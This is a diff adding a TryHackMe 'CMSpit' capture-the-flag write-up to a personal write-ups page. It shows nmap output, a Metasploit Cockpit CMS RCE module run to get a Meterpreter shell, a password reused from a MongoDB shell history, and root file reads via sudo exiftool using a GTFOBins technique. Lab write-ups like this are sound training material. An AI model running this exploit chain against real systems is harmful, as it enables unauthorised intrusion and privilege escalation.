@@ -19,7 +19,7 @@
 					<ul>
 						<li><a href="#lofi" class="active">Lofi</a></li>
 						<li><a href="#corridor">Corridor</a></li>
-					<!--	<li><a href="#three">More Writeups</a></li> -->
+					        <li><a href="#cmspit">CMSpit</a></li>
 					</ul>
 				</nav>
 				<footer>
@@ -58,7 +58,99 @@
 									</header>
 									<p>So first of all when we visit site we see many doors, if we choose one we can see we go to middle of nowhere now if we look at url it looks like: <pre> c4ca4238a0b923820dcc509a6f75849b </pre> so what is this ? if we try to decode it we find out it is a hash and it is a md5 hash so the room details clearly says that it is about IDOR and if you done any IDOR stuffs before you know that this CTFs loves the number 0 like i have seen this many times that going to number 0 gives us the thing so if we translate all md5 hash it lines up in a order so i think it is an IDOR so i thought i should try to put 0 so i turned 0 into md5 hash and it is: <pre> cfcd208495d565ef66e7dff9f98764da </pre> and when i visited url it gave me: <pre> flag{2477ef02448ad9************} </pre> so we got our flag so see you on another writeup bye ! </p>
 								</div>
-							</section>			
+							</section>
+								<!-- Main -->
+					<div id="main">
+
+						<!-- CMSpit -->
+							<section id="cmspit">
+								<div class="container">
+									<header class="major">
+										<h2>CMSpit Writeup</h2>
+										<p>TryHackMe(THM) CMSpit Room Writeup</a>.</p>
+									</header>
+									<p>So Hey Guys ! Welcome back to my another writeup and this writeup is on CMSpit and it gives 350 points and it is easy room so it is a good deal so without futher we do let's start ! First of all this is what result we get after running nmap (10.10.245.114 is my machine ip)<pre>└─# nmap -v 10.10.245.114 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-01 11:34
+Initiating Ping Scan at 11:34
+Scanning 10.10.245.114 [4 ports]
+Completed Ping Scan at 11:34, 0.26s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 11:34
+Completed Parallel DNS resolution of 1 host. at 11:34, 0.03s elapsed
+Initiating SYN Stealth Scan at 11:34
+Scanning 10.10.245.114 [1000 ports]
+Discovered open port 80/tcp on 10.10.245.114
+Discovered open port 22/tcp on 10.10.245.114
+Completed SYN Stealth Scan at 11:34, 2.48s elapsed (1000 total ports)
+Nmap scan report for 10.10.245.114
+Host is up (0.22s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Read data files from: /usr/share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 2.89 seconds
+           Raw packets sent: 1111 (48.860KB) | Rcvd: 1011 (40.448KB)
+</pre> Looks like someone have to get in web pentesting so let's continue and after visiting IP we see a name in Display maybe it is the CMS name, who knows ? <pre>Co****t</pre>now let's look for version and when i open source code we can see: <pre> src="/storage/tmp/7a812eebe1eda3162d79b4109b4787d4.js?ver=*******" type="text/javascript"> </pre> and maybe just maybe it is the version, who knows ? if we enumerate more we can find path that allows enumeration and i don't want my writeup seeing people struggle to find so let's: <pre>/auth/check</pre> so after we search for the cms and it's version within with it we can see a exploit: <pre> exploit/multi/http/cockpit_cms_rce</pre> now we can use this module in metasploit to enumerate: <pre>set RHOSTS 10.10.245.114</pre><pre>set LHOST tun0</pre> <pre>exploit/run</pre> after enumeration we can see some users and it is the answer of this question so let's move on to next question again struggle kinda stuff so: <pre>/auth/resetpassword</pre> now after we set the most powerful user as : <pre>set USER *****</pre> then if we run: <pre>exploit/run</pre> we get meterpreter so we can run: <pre>shell</pre> to get a shell and continue but before we do let's login into the site using that super user using that password provided by metasploit when we got specified user so after we login: <pre> click on cms name and icon > Finder > webflag.php </pre> then we get : <pre>thm{f158bea70731c48********}</pre> so now let's get back to metasploit so after we do : <pre> www-data@ubuntu:/home/stux$ ls -la
+ls -la
+total 44
+drwxr-xr-x 4 stux stux 4096 May 22  2021 .
+drwxr-xr-x 3 root root 4096 May 21  2021 ..
+-rw-r--r-- 1 root root   74 May 22  2021 .bash_history
+-rw-r--r-- 1 stux stux  220 May 21  2021 .bash_logout
+-rw-r--r-- 1 stux stux 3771 May 21  2021 .bashrc
+drwx------ 2 stux stux 4096 May 21  2021 .cache
+-rw-r--r-- 1 root root  429 May 21  2021 .dbshell
+-rwxrwxrwx 1 root root    0 May 21  2021 .mongorc.js
+drwxrwxr-x 2 stux stux 4096 May 21  2021 .nano
+-rw-r--r-- 1 stux stux  655 May 21  2021 .profile
+-rw-r--r-- 1 stux stux    0 May 21  2021 .sudo_as_admin_successful
+-rw-r--r-- 1 root root  312 May 21  2021 .wget-hsts
+-rw------- 1 stux stux   46 May 22  2021 user.txt
+www-data@ubuntu:/home/stux$  </pre> hmm .dbshell seems interesting let's open it : <pre> www-data@ubuntu:/home/stux$ cat .dbshell
+show
+show dbs
+use admin
+use sudousersbak
+show dbs
+db.user.insert({name: "stux", name: "[REDACTED]"})
+show dbs
+use sudousersbak
+show collections
+db
+show
+db.collectionName.find()
+show collections
+db.collection_name.find().pretty()
+db.user.find().pretty()
+db.user.insert({name: "stux"})
+db.user.find().pretty()
+db.flag.insert({name: "thm{c3d1af8da23926a30b0**********}"})
+show collections
+db.flag.find().pretty()
+ </pre> looks like someone got some creds so let's try btw our 2nd flag is "thm{c3d1af8da23926a30b0*******}" now after we try the creds for user "stux" we are in ! : <pre> www-data@ubuntu:/home/stux$ su stux
+Password: [REDACTED]
+
+stux@ubuntu:~$ cat user.txt
+thm{c5fc72c48759318**********}
+stux@ubuntu:~$ </pre> also we got our user flag nice now escalate to root : <pre> stux@ubuntu:~$ sudo -l
+Matching Defaults entries for stux on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User stux may run the following commands on ubuntu:
+    (root) NOPASSWD: /usr/local/bin/exiftool
+ </pre> looks like we can run exiftool as root let's go to <a href="https://gtfobins.github.io/">GTFOBins</a> and search for exiftool and we got file read commands now so let's run it: <pre> stux@ubuntu:~$ LFILE=/root/root.txt
+LFILE=/root/root.txt
+stux@ubuntu:~$ OUTPUT=/tmp/root.txt
+OUTPUT=/tmp/root.txt
+stux@ubuntu:~$ sudo exiftool -filename=$OUTPUT $LFILE
+sudo exiftool -filename=$OUTPUT $LFILE
+    1 image files updated
+</pre> now if we run : <pre> cat $OUTPUT </pre> we will get flag : <pre> stux@ubuntu:~$ cat $OUTPUT
+thm{bf52a85b12cf49b***************}
+stux@ubuntu:~$  </pre> and the last 2 question answer is : <pre> CVE-2021-22204 </pre> and : <pre> djvumake </pre> Thanks for reading this writeup see you in another writeup be safe and secure, bye ! </p>
+								</div>
+							</section>
 					</div>
 				<!-- Footer -->
 					<section id="footer">
